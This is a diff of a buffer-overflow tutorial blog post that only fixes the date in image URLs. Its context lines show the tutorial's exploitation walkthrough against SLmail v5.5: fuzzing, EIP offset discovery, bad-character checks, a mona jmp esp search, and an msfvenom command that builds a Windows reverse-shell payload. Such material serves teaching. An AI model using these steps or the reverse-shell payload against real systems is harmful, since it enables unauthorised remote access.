@@ -25,7 +25,7 @@ Stacks are fundamental to function calls. Each time a function is called it gets
 
 By convention, stacks usually grow down. This means that the stack starts at a high address in memory and progressively gets lower.
 
-![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/stack.png)
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/stack.png)
 
 ### Heap
 The heap is an area of memory that is managed by the process for on the fly memory allocation. This is for variables whose memory requirements are not known at compile time.
@@ -50,11 +50,11 @@ So the return address will be at %EBP+4, the first parameter at %EBP+8 and the f
 * **ESI**: source index, holds location of input data
 * **EDI**: destination index, points to location of where result of data operation is stored 
 
-![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/register.png)
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/register.png)
 
 Data is stored in the registers using "Little Endian", right to letf: value 0x12345678 is stored like "\x78\x56\x34\x12"
 
-![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/little_endian.png)
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/little_endian.png)
 
 ## Example
 Taking as an example the following code:
@@ -72,49 +72,49 @@ int main() {
 
 Initialy we have an empty stack.
 
-![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/1.png)
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/1.png)
 
 1- %EIP pointing at func in the main(). Saving the paramaters in inverse order.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/2.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/2.png)
 
 2- Saving the return address (the value of %EIP) in order to know which instruction will be the next to execute after exiting the function func().
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/4.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/4.png)
 
 3- %EIP now points at func() and %EBP is saved in order to restore the state after the function func() is executed.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/5.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/5.png)
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/6.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/6.png)
 
 4- %EBP = %ESP
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/8.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/8.png)
 
 5- Saving the local variables.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/10.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/10.png)
 
 6- Now the func() code can execute. %EIP will point each line of code.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/11.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/11.png)
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/12.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/12.png)
 
 7- After the execution, local variables are popped and moves %ESP back to where %EBP is.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/13.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/13.png)
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/14.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/14.png)
 
 8- %EBP is popped so its state can restored to the previous state before entering to func().
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/16.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/16.png)
 
 9- %EIP is popped so its state can restored to the previous state before entering to func().
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/18.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/18.png)
 
 10- Parameters sent to the funcion func() are popped.
 
@@ -140,19 +140,19 @@ The most common reason why buffer overflow attacks work is because applications 
 ## Example
 1- It is expected to be stored 8 characters.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack1.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/attack1.png)
 
 2- 8 'A's are correctly stored
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack2.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/attack2.png)
 
 3- Howeever, if insted of 8 'A's, 12 are stored, EBP value will be overwrited.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack3.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/attack3.png)
 
 4- If 16 'A' are stored, the register EIP will be overwrited. If an attacker is able to store malicious code in the memory where EIP is pointing, he will be able to execute it.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/attack4.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/attack4.png)
 
 
 ## Protections
@@ -219,11 +219,11 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   After the script execution, EIP value is overwrite with 41414141 which is the ASCII value of AAAA:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/fuzzing1.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/fuzzing1.png)
 
   Calculate how many bytes are needed to make the software crash. In this example, 2900 bytes:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/fuzzing2.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/fuzzing2.png)
 
 
 2- Identify with 4 bytes overwrite EIP
@@ -233,7 +233,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   pattern_create.rb -l NUM_BYTES
   ```
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_create.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/pattern_create.png)
 
 
   Using the unique patter in the script indentify_eip.py
@@ -269,14 +269,14 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   After the execution, the EIP will be overwrite with a unique pattern:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/identify_eip.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/identify_eip.png)
 
   Calculate the exact bytes which overwrite EIP using pattern_offset.rb:
   ```
   pattern_offset.rb -q EIP_VALUE
   ```
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_offset.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/pattern_offset.png)
 
 
 3- Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's by sending the script check_eip.py. If so, EIP should have 4 'B's.
@@ -313,11 +313,11 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   EIP value is 42424242 which is the ASCII value of BBBB:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/check_eip1.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/check_eip1.png)
 
   In memory, you can see how it has been overwrited with 'A', the EIP with 4 'B' and after with 'C':
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/check_eip2.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/check_eip2.png)
 
 
 
@@ -381,19 +381,19 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   After executing the script, if you look into the memory you can see how the characters from 0x01 to 0x09 are displayed correctly. However, after 0x09 all the following characters are broken:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0a.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/badchar_0a.png)
 
   If you add 0x0A as a badchar and send the script again, form 0x01 to 0x0C are displayed correctly. So 0x0A is a badchar:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0a2.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/badchar_0a2.png)
 
   Looking to the memory again, you can see how the character 0x0D is not displayed. It should be added as a badchar:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0d.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/badchar_0d.png)
 
   After adding the badchars 0x00, 0x0A and 0x0D, you can see how all the characters are correctly displayed ending with the 0xFF.
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchars_end.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/badchars_end.png)
 
   So. all characters from 0x01 to 0xFF, except for 0x00, 0x0A and 0x0D, are correctly represented.
 
@@ -412,7 +412,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   nasm_shell.rb jmp esp
   ```
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/op_code.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/op_code.png)
 
 
   Search for a dll which has the values "rebase", "safeSEH", "ASLR" and "NXCompact" set to false:
@@ -420,7 +420,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   !mona modules
   ```
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_modules.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/mona_modules.png)
 
   Look for a "jmp esp" inside the dll:
   ```
@@ -429,7 +429,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
   Select any pointer and copy its address:
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_find.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/mona_find.png)
 
 
 7- Create a shell
@@ -438,7 +438,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
   msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
   ```
 
-  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/msfvenom.png)
+  ![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/msfvenom.png)
 
 
 8- Exploit
@@ -516,4 +516,4 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
 After executing the exploit, reverse shell is obtained:
 
-![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/exploit.png)
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-02-27-Basic-Buffer-Overflow/exploit.png)
